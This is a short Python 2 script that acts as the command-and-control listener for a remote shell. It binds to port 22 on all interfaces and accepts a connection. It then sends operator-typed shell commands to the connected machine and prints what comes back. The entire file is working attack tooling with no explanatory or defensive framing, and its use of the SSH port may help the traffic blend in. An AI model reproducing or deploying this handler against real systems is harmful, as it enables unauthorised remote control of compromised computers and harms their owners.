#!/usr/bin/python
from socket import *
HOST = ''                 # '' bind to all interfaces
PORT = 22                #  port

s = socket(AF_INET, SOCK_STREAM)

s.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)

s.bind((HOST, PORT))

print "Listening on PORT:%s" % str(PORT)

s.listen(10) #10 Connections

conn, addr = s.accept()

print 'Connected by', addr

data = conn.recv(1024)

while True:
     command = raw_input("Enter shell command or quit: ")

     conn.send(command)

     if command == "quit": break

     data = conn.recv(1024)

     print data

conn.close()
